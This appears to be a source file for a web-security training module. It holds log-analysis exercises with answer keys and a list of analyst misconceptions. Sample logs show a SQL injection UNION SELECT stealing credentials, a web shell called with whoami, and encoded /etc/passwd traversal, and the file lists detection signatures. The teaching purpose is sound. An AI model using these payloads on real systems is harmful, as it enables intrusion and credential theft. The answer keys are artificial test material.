        '203.0.113.44 "GET /product?id=1\'"                     500 210   (SQL syntax error shown)\n203.0.113.44 "GET /product?id=1 UNION SELECT user,pw FROM staff--" 200 6120\n203.0.113.44 "GET /admin"                              200 4400   (logged in)\n203.0.113.44 "POST /admin/media/upload"               200 90\n203.0.113.44 "GET /media/uploads/x.php?c=whoami"       200 20     ("www-data")',
      question: 'What happened, did it succeed, and what do you do first?',
      steps: [
        'Line 1: appending a quote causes a 500 with a SQL error: the parameter is injectable and leaks database errors.',
        'Line 2: a UNION SELECT returns 6 KB where the product page is small: the attacker pulled staff usernames and passwords (in-band SQLi, data exfiltration).',
        'Line 3: /admin returns 200 (a login, not a 401/403): the stolen credentials worked.',
        'Lines 4-5: an upload, then a request to x.php in the uploads folder with `c=whoami` returning "www-data": a web shell now runs commands as the web user.',
      ],
      conclusion: 'This is a confirmed compromise: SQLi -> credential theft -> admin login -> web shell -> RCE. Contain the web server (isolate, preserve logs), revoke/reset the exposed staff credentials, remove the shell and hunt for lateral movement. Then fix the root cause: parameterise the query and move uploads out of the web root.',
    },
  ],
  faded: [
    {
      id: 'web-f1',
      title: 'Blocked, or just logged?',
      artifactLabel: 'WAF + app logs',
      artifact:
        'WAF: rule=930100 (LFI) data="../../../etc/passwd" mode=DETECTION action="would block"\nApp access log: "GET /view?f=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" 200 2043\nApp access log: "GET /view?f=/etc/hostname" 200 12',
      question: 'Did the WAF stop this attack?',
      given: [
        'The WAF rule matched an LFI payload but the mode is DETECTION, so its action is "would block", not "block".',
        'The app access log shows the encoded traversal returning 200 with 2043 bytes: the size of /etc/passwd, not an error page.',
      ],
      todo: [
        {
          prompt: 'What is the true status of the request?',
          type: 'mc',
          choices: [
            'It was allowed through and the file was read',
            'It was blocked before reaching the app',
            'It was quarantined for analyst review',
          ],
          answer: 'It was allowed through and the file was read',
          explanation: 'Detection-only mode logs but does not block. The 200 with a passwd-sized body confirms the app returned the file: the LFI succeeded.',
        },
        {
          prompt: 'What is the right first action?',
          type: 'mc',
          choices: [
            'Treat it as a successful LFI: hunt for what else was read, then fix the include and switch the WAF to blocking',
            'Close it because the WAF caught it',
            'Only switch the WAF to blocking and move on',
          ],
          answer: 'Treat it as a successful LFI: hunt for what else was read, then fix the include and switch the WAF to blocking',
          explanation: 'The attack got through, so scope it (what files were fetched, any follow-on like log poisoning), fix the vulnerable include, and turn on blocking. The WAF change alone leaves the app vulnerable and the current exposure unexamined.',
        },
      ],
    },
  ],
};

const misconceptions = [
  {
    id: 'web-oneclass',
    skill: S,
    name: 'Every payload looks the same',
    description: 'Cannot tell SQLi, XSS, traversal and command injection apart, so classifies attacks by guesswork.',
    fix: 'Each attack targets a different interpreter and has its own signature: quotes/UNION/SLEEP mean SQL; script tags and event handlers mean XSS in a browser; ../ and /etc/passwd mean file access; ; | && $( ) mean an OS shell. Name the interpreter and the attack names itself.',
    lesson: `${S}#injection`,
  },
  {
    id: 'web-encoding-blind',
    skill: S,
    name: 'Encoded input is harmless',
    description: 'Sees percent-encoding or HTML entities and assumes the request is benign because it does not contain literal attack characters.',
    fix: 'Encoding is the attacker\'s way past signatures. %2e%2e%2f is ../, %3Cscript%3E and &lt;script&gt; are <script>. Always URL-decode and HTML-decode every parameter before deciding a request is safe.',
    lesson: `${S}#logs`,
  },
  {
    id: 'web-waf-perfect',
    skill: S,
    name: 'The WAF stopped it, case closed',
    description: 'Treats a WAF as a complete fix and closes tickets on a single block without checking mode, variants or the app.',
    fix: 'A WAF is a compensating control that false-positives and can be evaded. Confirm it was in blocking mode (not detection-only), check for encoded or successful (200) variants, look at what the app returned, and push for the structural fix in code.',
    lesson: `${S}#owasp`,
  },
  {
    id: 'web-ssrf-internal',
    skill: S,
    name: 'The firewall stops SSRF',
    description: 'Thinks inbound firewalls or client-side checks protect against SSRF, or that reaching localhost/metadata is normal.',
    fix: 'SSRF requests originate from the trusted server, so inbound controls and browser checks do nothing. Defend at the fetch: allow-list destinations, block link-local/metadata (169.254.169.254) and RFC 1918 ranges, disable unused schemes and redirects, and require token-based metadata access.',
    lesson: `${S}#files`,
  },
  {
    id: 'web-stuffing-spray',
    skill: S,
    name: 'Stuffing and spraying are the same',
    description: 'Confuses credential stuffing with password spraying, so mis-scopes the response.',
    fix: 'Credential stuffing replays many leaked username/password pairs (many users, matching passwords, occasional hit). Password spraying tries one or few passwords across many accounts to stay under lockout thresholds. The pattern in the logs tells you which, and each needs a different response.',
    lesson: `${S}#auth-abuse`,
  },
];

export const WEB = { items, lesson, misconceptions };
